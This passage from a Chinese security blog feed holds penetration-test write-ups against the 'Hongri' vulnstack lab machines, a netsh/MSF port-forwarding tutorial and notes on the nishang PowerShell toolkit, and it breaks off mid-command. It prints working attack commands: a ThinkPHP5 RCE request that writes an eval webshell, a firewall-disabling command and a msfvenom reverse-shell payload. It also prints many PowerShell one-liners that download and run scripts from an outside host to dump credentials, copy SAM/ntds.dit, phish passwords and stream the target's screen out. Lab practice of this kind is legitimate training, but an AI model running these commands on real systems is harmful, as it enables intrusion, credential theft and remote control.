src="https://img-blog.csdnimg.cn/f58f6bd83fe74c8382972dc74c5728d8.png" alt="在这里插入图片描述"><br>用蚁剑连接<br><img src="https://img-blog.csdnimg.cn/b7a464e4c7fa45a898bcb579c797f37e.png" alt="在这里插入图片描述"><br>我这里直接用蚁剑上线C2马子<br><img src="https://img-blog.csdnimg.cn/0f4649bf51834a6491fb7e5921da1058.png" alt="在这里插入图片描述"></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>这里直接就是管理员权限了<br><img src="https://img-blog.csdnimg.cn/f11f2915ee0f44c2ac9488789d0e9bfa.png" alt="在这里插入图片描述"><br>用mimikatz跑一波<br><img src="https://img-blog.csdnimg.cn/0564d696c301485d97da4ab55d41295a.png" alt="在这里插入图片描述"><br>查看网卡<br><img src="https://img-blog.csdnimg.cn/dba2263cb4d148fb95f6f63a94d3b1eb.png" alt="在这里插入图片描述"><br>看看内网存活有那些主机和端口情况<br>这里应因为内网机不出网，密码也跑出来，万事具备只欠东风了(这里图片挂掉了)</p><p>首先在已上线的机器上创建如下监听，监听端口可自定义。利用已上线的主机，将它做一个Listener，实现链路上线CobalStrike。</p><p><img src="https://img-blog.csdnimg.cn/bb69a2919d9d49a4b7095ac3dd575d16.png" alt="在这里插入图片描述"></p><p>生成payload载荷<br><img src="https://img-blog.csdnimg.cn/b265f99f567c4813aebc224bf09be8ca.png" alt="在这里插入图片描述"><br>这里选择我们刚刚创建的那个listener<br><img src="https://img-blog.csdnimg.cn/8d7e24e5cc61416193d9d56b6b06adb3.png" alt="在这里插入图片描述"><br>将生成的载荷上传到目标机器，并执行<br><img src="https://img-blog.csdnimg.cn/7e64294c41d1459aaeeea87681e62c1f.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/c285c27dbe2a460b9621f421e36fd1c7.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/839a18d75eeb41489d45da0dfcfe2a8b.png" alt="在这里插入图片描述"><br>接下来就可以对其他的内网机进行上线了<br><img src="https://img-blog.csdnimg.cn/71a5a2143b904f888f72e0377c700df4.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/c2d3699f79ae4588a4c3b04a12b1bbbc.png" alt="在这里插入图片描述"></p><p>全部成功上线<br><img src="https://img-blog.csdnimg.cn/84af7d29c1e1458da791da059c67ee33.png" alt="在这里插入图片描述"><br>因为这是link链接，只要主链路（即出网机Listener）掉线，就都会掉线！</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>靶机复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日内网靶机五</title>
    <link href="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/"/>
    <url>/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/</url>
    
    <content type="html"><![CDATA[<p>靶机下载地址:<a href="http://vulnstack.qiyuanxuetang.net/vuln/">http://vulnstack.qiyuanxuetang.net/vuln/</a> win7（双网卡）： 192.168.1.18外网） 192.168.138.136（内网）</p><p>win2008:192.168.138.138</p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/cdb27832fd441d1196bd02fd68ef7669.png" alt="img"></p><p>访问80看看，是TP5的站</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e6aab55b754bad5839a1a16ac3e150ae.png" alt="img"></p><p>关于tp5的漏洞利用方式请查看：<a href="https://www.cnblogs.com/backlion/p/10106676.html">https://www.cnblogs.com/backlion/p/10106676.html</a></p><p>成功利用，并执行了命令</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e5084cd3b81e7729d2ccac9aaeda8e30.png" alt="img"></p><p>写入shell</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">http</span>:<span class="hljs-comment">//192.168.1.18/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo ^&lt;?php @eval($_POST[&quot;code&quot;]);?^&gt;&gt;shell.php</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/8d05ff828389e196b6474663a23529d1.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/31e9a3f10c58458df56942d1e55abf5a.png" alt="img"></p><p>上线C2</p><p><img src="https://img-blog.csdnimg.cn/img_convert/4ff44b5a7ad284d026c5afc7bec00c12.png" alt="img"></p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/a134f7cc25adea0de6abe92284082f37.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/7ebc284b872a9ad3d9830b080725ae1b.png" alt="img"></p><p>内网存活主机探测</p><p><img src="https://img-blog.csdnimg.cn/img_convert/4a6179495f22f2c78e13e0aacc25cda7.png" alt="img"></p><p>查看域控</p><p><img src="https://img-blog.csdnimg.cn/img_convert/77ebaadbac841153ba66be1ffd8e45cd.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/67d88860713a334ebd15cf640d0a46b4.png" alt="img"></p><p>现在已经是管理员权限了可以直接抓下密码看看</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f098aec95f905f48cd3120f9cd43c5b5.png" alt="img"></p><p>上链路进行横向</p><p><img src="https://img-blog.csdnimg.cn/img_convert/95d6852e550de119d7975b72dba1fc95.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/c3805db9f3f23701c7c022a61ffde7c1.png" alt="img"></p><p>生成载荷上传到目标机器</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a4d546dd2d508a9c50d74b37499a7813.png" alt="img"></p><p>批量上线DC不成功</p><p><img src="https://img-blog.csdnimg.cn/img_convert/00bc2d1a9f53873a37bb50155a6f8b8c.png" alt="img"></p><h3 id="因为win7的防火墙缘故，5555端口是进不去的可以，关闭防火墙-NetSh-Advfirewall-set-allprofiles-state-off-，或者添加规则来放行5555端口"><a href="#因为win7的防火墙缘故，5555端口是进不去的可以，关闭防火墙-NetSh-Advfirewall-set-allprofiles-state-off-，或者添加规则来放行5555端口" class="headerlink" title="**因为win7的防火墙缘故，5555端口是进不去的可以，关闭防火墙:**NetSh Advfirewall set allprofiles state off ，或者添加规则来放行5555端口"></a>**因为win7的防火墙缘故，5555端口是进不去的可以，关闭防火墙:**<strong>NetSh Advfirewall set allprofiles state off</strong> <strong>，或者添加规则来放行5555端口</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">netsh advfirewall firewall add rule name=cs dir=<span class="hljs-keyword">in</span> action=allow protocol=<span class="hljs-variable constant_">TCP</span> localport=<span class="hljs-number">5555</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/a72db8603f4c92b6d98b876f78f3bc60.png" alt="img"></p><p>最后全部上线</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9950cf5a36cc4583a8e87e1cf170f79a.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>靶机复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日内网靶机二</title>
    <link href="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/"/>
    <url>/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/</url>
    
    <content type="html"><![CDATA[<p>大致拓扑图如下</p><p><img src="https://img-blog.csdnimg.cn/img_convert/21c348e08f5e752ffee5af89947802e5.png" alt="img"></p><p>web win server2008(10.0.10.80,192.168.1.16)</p><p>pc win7(10.10.10.201)</p><p>dc win server2012(10.10.10.10)</p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>端口探测</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b13c45147a2fd61e4dbbeacab0189e55.png" alt="img"></p><p>发现有7001端口，可能存在weblogic</p><p><img src="https://img-blog.csdnimg.cn/img_convert/bace8cafaf8e3d4fec26a9538574d190.png" alt="img"></p><p>确实存在探测下目录</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5b3b8328ce73972d298adf6c85900c62.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/c1d2181c1aa7ffcd3751ae4c43451bf5.png" alt="img"></p><p>弱口令无果，尝试用工具利用</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a3a5af53ac2478bc23de5ab26636fa1c.png" alt="img"></p><p>存在漏洞并且返回了用户名</p><p><img src="https://img-blog.csdnimg.cn/img_convert/cc5851bb4ac943e6b6d33a5ea14b3a41.png" alt="img"></p><p>能成功执行命令，我这里就直接上传webshell。</p><p>关于weblogic上传路径问题请参考：<a href="https://www.cnblogs.com/sstfy/p/10350915.html">https://www.cnblogs.com/sstfy/p/10350915.html</a></p><p><img src="https://img-blog.csdnimg.cn/img_convert/53867b96c29672a39361edf8764e154d.png" alt="img"></p><p>因为这里目标机有杀软上传普通马子会被连不上，所以我这里直接用冰歇的马子</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e2ca9e8932ad8f53364887e2ebc501cf.png" alt="img"></p><p>为了方便操作弹个shell到c2上</p><p><img src="https://img-blog.csdnimg.cn/img_convert/2f4c912c8d6c6eebf87fdf282063d0e8.png" alt="img"></p><p>提下权（我这里用的ms15-051）</p><p><img src="https://img-blog.csdnimg.cn/img_convert/20312a2c486a5fe59df0b74be5abeae3.png" alt="img"></p><p>信息收集一波</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d3ad83ed6fec1eb87f4bf86a44c184c0.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/5f4d039aa2c2621edace7efd02856d6a.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/c7b1be12aa461ce700011c9e9a8a7a78.png" alt="img"></p><p>基本可判断域控主机为10.10.10.10</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b61cc4ebe004a2f47b77a28d2531dead.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/8265b93a6cd10ade7ccc2865eaf8adc9.png" alt="img"></p><p>看一下内网主机存活情况</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d87c74c850eced71a950ddc95e7f3e8d.png" alt="img"></p><p>抓下密码进行横向</p><p><img src="https://img-blog.csdnimg.cn/img_convert/7b611ac7288cbc7c56b179fe70b514c8.png" alt="img"></p><p>这里由于目标机不出网，这里做链路上线。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/555c4f270a2ce4c42583d6947ab1f9ec.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/84edafdbf24f859eb716c2471a7c285a.png" alt="img"></p><p>生成载荷上传目标机并执行</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b912f6ed38ec92dba3b2e300cc7a3bc2.png" alt="img"></p><p>利用抓取得凭证进行批量上线</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c5f88efc494bf972b8067abadc58f052.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>靶机复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>端口转发</title>
    <link href="/2022/06/15/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    <url>/2022/06/15/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<h2 id="netsh的基本使用（需要有admin权限）"><a href="#netsh的基本使用（需要有admin权限）" class="headerlink" title="netsh的基本使用（需要有admin权限）"></a>netsh的基本使用（需要有admin权限）</h2><p>通过做端口映射访问内网主机<br><strong>做映射</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-built_in">add</span> v4tov4 <span class="hljs-attribute">listenaddress</span>=192.168.101.107 <span class="hljs-attribute">listenport</span>=14941     <span class="hljs-attribute">connectaddress</span>=192.168.101.106 <span class="hljs-attribute">connectport</span>=1494<br></code></pre></td></tr></table></figure><p>其中listenaddress是我们监听的地址<br>listenport是监听端口<br>connectaddress 是连接地址</p><p>还可以这样写</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-built_in">add</span> v4tov4 <span class="hljs-attribute">listenport</span>=14941 <span class="hljs-attribute">connectaddress</span>=192.168.101.106 <span class="hljs-attribute">connectport</span>=1494<br></code></pre></td></tr></table></figure><p><strong>使用下面命令进行查看端口</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">netsh <span class="hljs-keyword">interface</span> <span class="hljs-symbol">portproxy</span> <span class="hljs-symbol">show</span> <span class="hljs-symbol">v4tov4</span><br></code></pre></td></tr></table></figure><p><strong>取消端口转发：</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy delete v4tov4 <span class="hljs-attribute">listenaddress</span>=192.168.101.107 <span class="hljs-attribute">listenport</span>=14941<br></code></pre></td></tr></table></figure><p><strong>清除所有规则</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">netsh <span class="hljs-keyword">interface</span> <span class="hljs-symbol">portproxy</span> <span class="hljs-symbol">reset</span><br></code></pre></td></tr></table></figure><h2 id="MSF利用netsh转发"><a href="#MSF利用netsh转发" class="headerlink" title="MSF利用netsh转发"></a>MSF利用netsh转发</h2><p><img src="https://img-blog.csdnimg.cn/202107161602153.png" alt="在这里插入图片描述"><br>在msf中生成木马</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=10.10.10.153 <span class="hljs-attribute">lport</span>=4455 -f exe &gt; one.exe  <br></code></pre></td></tr></table></figure><p>在A服务器上使用netsh做转发</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-built_in">add</span> v4tov4 <span class="hljs-attribute">listenport</span>=4455 <span class="hljs-attribute">connectaddress</span>=192.168.0.135 <span class="hljs-attribute">connectport</span>=4455<br></code></pre></td></tr></table></figure><p>在kali中设置监听</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">use windows/multi/handler<br><span class="hljs-keyword">set</span> windows/meterpreter/reverse_tcp<br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost 192.168.0.135</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 4455</span><br></code></pre></td></tr></table></figure><h2 id="cobaltstrike利用netsh转发"><a href="#cobaltstrike利用netsh转发" class="headerlink" title="cobaltstrike利用netsh转发"></a>cobaltstrike利用netsh转发</h2><p><img src="https://img-blog.csdnimg.cn/20210716164544443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="msf下的端口转发"><a href="#msf下的端口转发" class="headerlink" title="msf下的端口转发"></a>msf下的端口转发</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">portfwd</span>   add -l <span class="hljs-number">8080</span> r <span class="hljs-number">192.168.1.1</span> -p <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>将本地8080端口的请求转发到远端的80端口上</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>端口转发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nishang学习</title>
    <link href="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="nishang模块及其功能"><a href="#nishang模块及其功能" class="headerlink" title="nishang模块及其功能"></a>nishang模块及其功能</h2><table><thead><tr><th>模块</th><th>功能</th></tr></thead><tbody><tr><td>Antak-Webshell</td><td>webshell</td></tr><tr><td>Backdoors</td><td>后门</td></tr><tr><td>Client</td><td>客户端</td></tr><tr><td>Escalation</td><td>提权</td></tr><tr><td>Execution</td><td>RCE</td></tr><tr><td>Gather</td><td>信息收集</td></tr><tr><td>Misc</td><td>杂项</td></tr><tr><td>Pivot</td><td>跳板&#x2F;远程控制  EXE</td></tr><tr><td>Scan</td><td>扫描</td></tr><tr><td>powerpreter</td><td>Meterreter会话</td></tr><tr><td></td><td></td></tr></tbody></table><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul><li><p><strong>Check-VM</strong><br>检查是否为虚拟机</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell -nop -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Check-VM.ps1&#x27;)&quot;</span><span class="hljs-comment">;Check-VM</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/a8c4241ddad848699962dfb7eca88b9e.png" alt="在这里插入图片描述"></p></li><li><p><strong>Invoke-CredentialsPhish</strong><br>欺骗目标主机用户，让用户输入密码。</p></li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell -nop -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Invoke-CredentialsPhish.ps1&#x27;)&quot;</span><span class="hljs-comment">;Invoke-CredentialsPhish</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d89b62b0e86241518ba52dbac9ead982.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>输入密码弹框才会消失<br><img src="https://img-blog.csdnimg.cn/15603ca1555047878f791498efd0eedf.png" alt="在这里插入图片描述"></p><ul><li><strong>Copy-VSS</strong><br>这个脚本利用Volume Shadow Copy服务复制sam文件，如果这个脚本运行在了DC机上，ntds.dit和system hive也能被拷贝出来</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">powershell -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Copy-VSS.ps1&#x27;)&quot;</span>;copy-vss -DestinationDir c:/  <br><span class="hljs-regexp">//</span>copy-vss  <span class="hljs-comment">#把文件保存到当前路径下</span><br><span class="hljs-regexp">//</span>copy-vss -DestinationDir c:/   <span class="hljs-comment">#把文件保存在c盘下</span><br></code></pre></td></tr></table></figure><ul><li><strong>FireBuster  FireListener扫描器</strong><br>对内网进行扫描，打开本地监听，然后远程传送数据，把包发给FireListener</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#首先在本地输入以下命令运行FireListener</span><br><span class="hljs-attribute">powershell</span> -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/FireListener.ps1&#x27;)&quot;</span>;FireListener <span class="hljs-number">130</span>-<span class="hljs-number">150</span><br><span class="hljs-comment">#接着输入如下命令</span><br><span class="hljs-attribute">powershell</span> -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/FireBuster.ps1&#x27;)&quot;</span>;FireBuster  <span class="hljs-number">192.168.43.161</span> <span class="hljs-number">130</span>-<span class="hljs-number">150</span> -Verbose<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/f8a75adc51744a689648b3ba4de094f5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><ul><li><strong>Invoke Mimikatz</strong></li></ul><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">nvoke-Mimikatz  -DumpCerts    ##Dump出本机的凭证信息<br>Invoke-Mimikatz  -DumpCerts   -ComputerName @（“computer1”，“computer2”） ##Dump 出远程的两台计算机的凭证信息<br>Invoke-Mimikatz  -Command <span class="hljs-string">&quot;privillage::debug exit&quot;</span> -ComputerName <span class="hljs-string">&quot;computer1&quot;</span> ##在远程的一台机器上运行Mimikatz并执行 <span class="hljs-string">&quot;privillage::debug exit&quot;</span><br><br>powershell -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Invoke-Mimikatz.ps1&#x27;)&quot;</span>;Invoke-Mimikatz  -DumpCerts  <br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c1ec5aea440749fb942f76562b454811.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><ul><li><p><strong>Get-PassHashes</strong><br>需administrator权限</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell -nop -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Get-PassHashes.ps1&#x27;)&quot;</span><span class="hljs-comment">;Get-PassHashes</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/1b5310571bf5485d8892b11ea5e35434.png" alt="在这里插入图片描述"></p></li><li><p><strong>Get-PassHints</strong><br>获取用户的密码提示信息，需administrator权限，可根据提示信息生成密码字典提高爆破成功几率</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell -nop -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Get-PassHints.ps1&#x27;)&quot;</span><span class="hljs-comment">;Get-PassHints</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/e3b3991b57c34bbe8aa4e108c917677c.png" alt="在这里插入图片描述"></p></li><li><p><strong>Invoke-PortScan</strong></p></li></ul><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>StartAddress</td><td>扫描范围开始的地址</td></tr><tr><td>EndAddress</td><td>扫描范围结束的地址</td></tr><tr><td>ScanPort</td><td>进行端口扫描</td></tr><tr><td>Port</td><td>执行端口，有默认端口</td></tr><tr><td>Timout</td><td>超时时间</td></tr><tr><td>ResolveHost</td><td>存活主机并解析主机名</td></tr></tbody></table><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">powershell</span> -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Scan/Invoke-PortScan.ps1&#x27;)&quot;</span>; Invoke-PortScan -StartAddress <span class="hljs-number">192.168.43.1</span> -EndAddress <span class="hljs-number">192.168.43.50</span> -ResolveHost  <br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/712e69666696412eb16eb47c1abbc4d0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><ul><li><strong>Invoke-BruteForce</strong><br>对SQL Server，域控制器(ActiveDirectory)，web以及ftp弱口令爆破</li></ul><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>ComputerName</td><td>对应服务的计算机名</td></tr><tr><td>UserList</td><td>用户名字典</td></tr><tr><td>PasswordList</td><td>密码字典</td></tr><tr><td>Service</td><td>服务  默认为sql服务</td></tr><tr><td>Delay</td><td>延迟时间</td></tr><tr><td>StopOnSucess</td><td>匹配一个后停止</td></tr></tbody></table><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">powershell</span> <span class="hljs-operator">-</span><span class="hljs-variable">nop</span> <span class="hljs-operator">-</span><span class="hljs-variable">c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Scan/Invoke-BruteForce.ps1&#x27;)&quot;</span><span class="hljs-operator">;</span><span class="hljs-variable">Invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">BruteForce</span> <span class="hljs-operator">-</span><span class="hljs-variable">ComputerName</span> <span class="hljs-variable">WEB</span> <span class="hljs-operator">-</span><span class="hljs-variable">UserList</span>  <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">tools</span>\<span class="hljs-number">1.</span><span class="hljs-variable">txt</span>  <span class="hljs-operator">-</span><span class="hljs-variable">PasswordList</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">tools</span>\<span class="hljs-number">1.</span><span class="hljs-variable">txt</span>  <span class="hljs-operator">-</span><span class="hljs-variable">Service</span> <span class="hljs-variable">FTP</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Verbose</span><br></code></pre></td></tr></table></figure><ul><li><strong>屏幕窃取</strong><br>Show-TargetScreen脚本使用MJPEG传输目标机远程桌面的实时画面。</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Show</span>-TargetScreen -Reverse -IPAddress <span class="hljs-number">1.116.233.115</span> -Port <span class="hljs-number">443</span>  #Reverse反向连接 Bind  正向连接<br><br><span class="hljs-attribute">powershell</span> -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Show-TargetScreen.ps1&#x27;)&quot;</span>;Show-TargetScreen -Reverse -IPAddress <span class="hljs-number">1.116.233.115</span> -Port <span class="hljs-number">1111</span><br><span class="hljs-comment">#在攻击机上</span><br><span class="hljs-attribute">nc</span> -nlvp <span class="hljs-number">1111</span>| nc -nlvp <span class="hljs-number">9999</span>   #访问本机<span class="hljs-number">9999</span>端口即可<br></code></pre></td></tr></table></figure><h2 id="powershell-隐藏通信隧道"><a href="#powershell-隐藏通信隧道" class="headerlink" title="powershell 隐藏通信隧道"></a>powershell 隐藏通信隧道</h2><ul><li>I<strong>nvoke-PowershellTcp</strong></li></ul><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>IPAddress</td><td>选择-Reverse选项时表示需要连接的IP地址</td></tr><tr><td>Port<int32></td><td>选择-Reverse选项时表示需要连接的端口，选择-Bind选项时表示需要监听的端口</td></tr><tr><td>Reverse</td><td>反向连接</td></tr><tr><td>Bind</td><td>正向连接</td></tr></tbody></table><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#反向</span><br><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">3333</span><br><br><span class="hljs-attribute">powershell</span> -nop -c 